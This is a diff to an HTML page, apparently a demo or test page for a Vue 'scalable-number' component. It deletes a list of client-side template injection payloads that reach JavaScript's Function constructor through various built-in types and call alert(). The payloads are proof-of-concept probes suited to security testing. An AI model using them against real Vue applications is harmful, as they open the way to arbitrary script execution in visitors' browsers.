@@ -59,15 +59,5 @@
 </li>
 </ol>
 <p>Various injections trough scalable number</p>
-<p>&lt;scalable-number v-bind:number="''.constructor.constructor('alert(1)')()"&gt;&lt;/scalable-number&gt;<br>
-&lt;scalable-number v-bind:number="(0).constructor.constructor('alert(2)')()"&gt;&lt;/scalable-number&gt;<br>
-&lt;scalable-number v-bind:number="/x/.constructor.constructor('alert(3)')()"&gt;&lt;/scalable-number&gt;<br>
-&lt;scalable-number v-bind:number="true.constructor.constructor('alert(4)')()"&gt;&lt;/scalable-number&gt;<br>
-&lt;scalable-number v-bind:number="[].constructor.constructor('alert(5)')()"&gt;&lt;/scalable-number&gt;<br>
-&lt;scalable-number v-bind:number="''.constructor.constructor('alert(6);return 1')()"&gt;&lt;/scalable-number&gt;<br>
-&lt;scalable-number v-bind:number="''.constructor.constructor('alert(7)')()"&gt;&lt;/scalable-number&gt;<br>
-&lt;scalable-number v-bind:number="''.constructor.constructor('alert(8)')()"    v-bind:factor='1'&gt;&lt;/scalable-number&gt;<br>
-&lt;scalable-number v-bind:number="&#39;&#39;.constructor.constructor(&#39;alert(9)&#39;)()"&gt;&lt;/scalable-number&gt;<br>
-<scalable-number v-bind:number="1"></scalable-number><br>
-<scalable-number></scalable-number><br>
-&lt;scalable-number v-bind:number='1+1' v-bind:factor='1'&gt;&lt;/scalable-number&gt;</p>
+<p><scalable-number v-bind:number="1"></scalable-number><br>
+<scalable-number></scalable-number></p>
